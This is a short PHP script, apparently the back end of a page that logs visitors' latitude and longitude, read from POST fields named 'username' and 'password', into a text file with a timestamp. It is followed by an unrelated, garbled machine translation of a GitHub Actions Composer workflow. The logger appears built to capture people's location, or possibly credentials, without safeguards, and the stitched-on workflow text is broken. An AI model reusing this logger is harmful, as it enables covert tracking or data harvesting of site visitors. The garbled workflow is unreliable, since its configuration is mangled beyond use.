<?php

 

 @$time=date('Y-m-d H:i:s',time());  //获取当前时间

 

 $nowLatitude="纬度 ".$_POST['username'];    //接受上个页面传过来的参数（经度坐标）

 

 $nowlongitude="经度 ".$_POST['password']."   ------时间是".$time."\r\n";;    //接受上个页面传过来的参数（纬度坐标）

 

 $fp=fopen("geo.txt", "a+");  //创建一个geo.txt文件

 

 fwrite($fp, $nowLatitude);   //把经度写入到geo.txt里

 

 fwrite($fp, $nowlongitude);   //把纬度写入到geo.txt里



?>名称：PHPComposer n n非：n Push：n分支：[master]n拉请求：n分支：n构建：n n运行-on：Ubuntu-最新的n个步骤：n-use：action/checkout@v2n-name：ValidalComposer.json和Composer.nrun：Composer验证n n-name：install依赖关系n-name：Composer install-偏好-dist-no-process-no-建议n#向Composer.json添加测试脚本，例如：“测试”：“供应商/bin/phpunit”n#Docs：https://getcomposer.org/doc/articles/scripts.md n n#-name：Run test套件n#run：Composer Run-script test
